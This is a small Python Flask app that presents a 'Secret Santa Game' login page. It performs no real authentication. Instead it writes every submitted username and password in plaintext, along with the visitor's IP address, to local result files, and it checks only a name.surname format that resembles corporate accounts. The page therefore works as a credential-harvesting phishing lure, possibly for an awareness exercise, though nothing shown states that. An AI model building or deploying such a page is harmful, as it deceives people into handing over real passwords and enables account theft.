import re
from flask import Flask, request, render_template

app = Flask(__name__)

# Regular expression for username: name.surname, where name length is between 3 and 13 characters
username_regex = re.compile(r'^[a-zA-Z]{3,8}\.[a-zA-Z]{5,13}$')

# Regular expression for password: at least 10 characters, including uppercase, lowercase, digits, and punctuation
password_regex = re.compile(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*(),.?":{}|<>])[a-zA-Z\d!@#$%^&*(),.?":{}|<>]{10,}$')
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        ip_address= request.remote_addr

        # Check if the username and password match the specified regex
        if not (username_regex.match(username) and password_regex.match(password)):
            with open("results/fail.txt", "a") as f:
                f.write(f"\nUsername:{username} Password:{password} IP:{ip_address}\n")
            return "Invalid username or password. Please check the format and criteria. <a href='/login'>Go back to login</a>"
        else:
            with open("results/success.txt", "a") as f:
                f.write(f"\nUsername:{username} Password:{password} IP:{ip_address}\n")
            return "You joined the Secret Santa Game!"
    
    return render_template("login.html")

if __name__ == "__main__":
    app.run()
